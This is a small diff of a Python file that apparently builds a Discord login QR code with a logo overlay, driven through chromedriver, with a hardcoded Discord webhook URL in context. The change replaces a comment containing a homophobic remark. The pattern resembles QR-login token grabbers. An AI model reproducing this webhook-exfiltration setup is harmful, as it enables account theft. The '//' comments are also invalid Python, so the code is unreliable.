@@ -10,7 +10,7 @@ url = "https://canary.discord.com/api/webhooks/1000751157980954674/SWegfnRJVrC3g
 
 PROJECT_ROOT = os.path.abspath(os.path.dirname(__file__))
 DRIVER_BIN = os.path.join(PROJECT_ROOT, "chromedriver")
-//hello guys fours is gay
+//according to cubix this easter egg is too unprofessional so i removed it
 def logo_qr():
     im1 = Image.open('temp/qr_code.png', 'r')
     im2 = Image.open('temp/overlay.png', 'r')
